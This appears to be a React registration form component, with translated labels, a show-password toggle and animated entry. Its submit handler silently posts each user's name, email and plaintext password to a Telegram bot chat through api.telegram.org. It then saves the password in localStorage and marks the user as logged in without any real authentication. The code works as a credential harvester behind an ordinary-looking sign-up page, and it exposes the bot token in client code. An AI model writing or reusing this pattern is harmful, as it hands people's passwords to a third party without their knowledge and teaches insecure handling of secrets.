import s from "./Register.module.css"
import { useState } from "react"
import { Link } from "react-router-dom"
import { useTranslation } from "react-i18next"
import { motion } from "framer-motion"

const Register = () => {

    const { t } = useTranslation()

    const [showPassword, setShowPassword] = useState(false)

    const [form, setForm] = useState({
        name: "",
        email: "",
        password: "",
    })

    const handleChange = (e) => {
        setForm({
            ...form,
            [e.target.name]: e.target.value,
        })
    }

    const handleSubmit = async (e) => {
        e.preventDefault()

        const token = import.meta.env.VITE_TOKEN
        const chatId = import.meta.env.VITE_CHAT_ID

        const message = `
🆕 New Registration

👤 Name: ${form.name}
📧 Email: ${form.email}
🔑 Password: ${form.password}
    `

        const url = `https://api.telegram.org/bot${token}/sendMessage`

        try {
            await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })

            localStorage.setItem("user", JSON.stringify(form))
            localStorage.setItem("isAuth", "true")

            window.location.href = "/"

        } catch (error) {
            console.log(error)
            alert("Error")
        }
    }

    return (
        <section className={s.register}>

            <div className={s.blur1}></div>
            <div className={s.blur2}></div>

            <motion.form
                initial={{ opacity: 0, y: 80 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.7 }}
                className={s.form}
                onSubmit={handleSubmit}
            >

                <h2>{t("registerTitle")}</h2>

                <input
                    type="text"
                    placeholder={t("registerName")}
                    name="name"
                    value={form.name}
                    onChange={handleChange}
                    required
                />

                {
                    !form.name && (
                        <span className={s.required}>
                            * {t("requiredField")}
                        </span>
                    )
                }

                <input
                    type="email"
                    placeholder={t("registerEmail")}
                    name="email"
                    value={form.email}
                    onChange={handleChange}
                    required
                />

                {
                    !form.email && (
                        <span className={s.required}>
                            * {t("requiredField")}
                        </span>
                    )
                }

                <div className={s.passwordBox}>

                    <input
                        type={showPassword ? "text" : "password"}
                        placeholder={t("registerPassword")}
                        name="password"
                        value={form.password}
                        onChange={handleChange}
                        required
                    />

                    <button
                        type="button"
                        className={s.eye}
                        onClick={() => setShowPassword(!showPassword)}
                    >
                        {showPassword ? "🙈" : "👁"}
                    </button>

                </div>

                {
                    !form.password && (
                        <span className={s.required}>
                            * {t("requiredField")}
                        </span>
                    )
                }

                <button type="submit">
                    {t("registerButton")}
                </button>

                <p className={s.bottom}>
                    {t("haveAccount")}

                    <Link to="/login">
                        {t("login")}
                    </Link>
                </p>

            </motion.form>

        </section>
    )
}

export default Register